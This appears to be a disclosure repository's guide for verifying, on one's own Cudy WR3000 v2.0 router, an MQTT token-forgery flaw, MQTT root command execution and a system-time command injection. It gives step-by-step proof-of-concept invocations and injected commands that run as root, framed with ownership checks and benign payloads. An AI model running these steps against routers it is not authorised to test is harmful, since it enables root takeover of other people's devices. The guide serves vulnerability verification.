# Verify on your own device (authorized research only)

This page is for a **Cudy WR3000 v2.0 that you own and control**. It uses placeholders and the
tools' `--demo` modes. Do not point these tools at devices that are not yours, and do not use
them on a network you do not administer.

The tools here never contain a fleet secret. For the MQTT checks you need **your own unit's**
`bdinfo` `secret`. Keep it in a shell variable or a file outside any repository, never commit
it, and delete it when you are done.

## 0. Safety checklist

- [ ] The device is yours (or you have explicit written permission).
- [ ] It is on an isolated LAN, not a production network.
- [ ] You know how to reflash it, and you accept that you may have to.
- [ ] Every command you run on the device is read-only or writes to `/tmp`.
- [ ] You will not publish your unit's `secret`, tokens, MAC, serial, or calibration data.

## 1. Identify the platform and firmware

On the device (SSH) or from the web UI, record:

    cat /etc/openwrt_release
    cat /etc/version 2>/dev/null || true
    uname -a

The affected build is **2.4.15-20251030-114751** (OpenWrt 22.03.6, kernel 5.10.201). The
systime injection is fixed in **2.5.24-20260727-122111**. Confirm from the PCB that this is the
luofu v2 board, not the MediaTek MT7981 WR3000 v1.

## 2. Check exposure (read-only)

    netstat -ltn | grep -E ':1883|:8883'
    cat /etc/mosquitto/mosquitto.conf
    cat /etc/mosquitto/aclfile.conf
    ps w | grep -E 'cmagent|mosquitto'
    ls -la /var/run/cmagent
    logread | grep -i cmagent | tail -20

The risk conditions are: the broker is listening beyond `127.0.0.1`/`::1`, the WAN firewall
does not reject input on those ports, and `cmagent` runs with `-a` (admin) or has satellites
in `/var/run/cmagent`. Stop here if this is not your device.

## 3. Demo mode: what the tools look like with no secrets

    python3 -m pip install -r tools/requirements.txt
    python3 tools/forge_jwt.py --demo
    python3 tools/mqtt_command_poc.py --demo
    python3 tools/systime_rce_poc.py --demo

These print the JWT shape, the MQTT topic/payload shape, and the form request shape using a
placeholder secret and a documentation IP (`192.0.2.10`). Nothing is sent over the network.

## 4. Verify CVE-2026-71960 on your own broker

You need your own unit's `bdinfo` `secret`. Extract it from your own device only (the private
decryptor is not shipped here; the constants are described in the MQTT writeup). Then:

    read -r -s BDINFO_SECRET   # paste your own value; it stays out of shell history
    python3 tools/forge_jwt.py --deviceid cudydevice --role satellite --secret "$BDINFO_SECRET"

Connect to **your** broker with username `cudydevice` and the printed token as the password,
using `tools/mqtt_command_poc.py --host <your router> --secret "$BDINFO_SECRET"`. A
`CONNACK rc=0` and a granted SUBACK on `router/+/000000000000/+/+/+` confirm the plugin
accepted the forged token. The client is passive unless you pass `--cmd`.

Cleanup: `unset BDINFO_SECRET`, remove any captured token from your terminal history.

## 5. Verify CVE-2026-71961 (own hardware only)

    python3 tools/mqtt_command_poc.py --host <your router> --secret "$BDINFO_SECRET" \
        --cmd 'id > /tmp/mqtt-poc.txt'

Then read `/tmp/mqtt-poc.txt` on **your** device (SSH). `uid=0(root)` shows the command ran
as root. The tool's allowlist only permits benign commands (`id`, `uname`, `echo`,
`hostname`, `true`); do not edit it to run anything you are not prepared to lose.

Cleanup: `rm /tmp/mqtt-poc.txt` on the device, `unset BDINFO_SECRET`.

## 6. Verify the system-time injection on your own web UI

1. Log in to **your** router's LuCI and open `/cgi-bin/luci/admin/system/systime`.
2. Copy the CSRF `token` and the session cookie.
3. Dry run first:

       python3 tools/systime_rce_poc.py --url http://<your router> \
           --cookie 'sysauth=<your session>' --token <csrf>

   It prints the exact form body without sending it.
4. Send the benign payload when it looks right:

       python3 tools/systime_rce_poc.py --url http://<your router> \
           --cookie 'sysauth=<your session>' --token <csrf> --send

5. Read `/tmp/systime-poc.txt` on the device; `uid=0(root)` confirms root execution.

Cleanup: `rm /tmp/systime-poc.txt`; log out of LuCI.

## 7. Interpreting results

- If the JWT is rejected (CONNACK rc != 0), your unit's `bdinfo` secret differs, the plugin
  checks changed, or the username/ACL differs. Do not keep trying; record the result.
- If `cmagent` does not execute the payload on your unit, the role or topic contract may have
  changed. The trailing NUL byte matters: the tools add it for you.
- A fixed `systime.lua` (2.5.24+) will not execute the injected command; that is the expected
  result on a patched build.

If you get results that contradict this writeup, please open an issue with the firmware build
and the exact observation (no secrets, no per-unit identifiers).
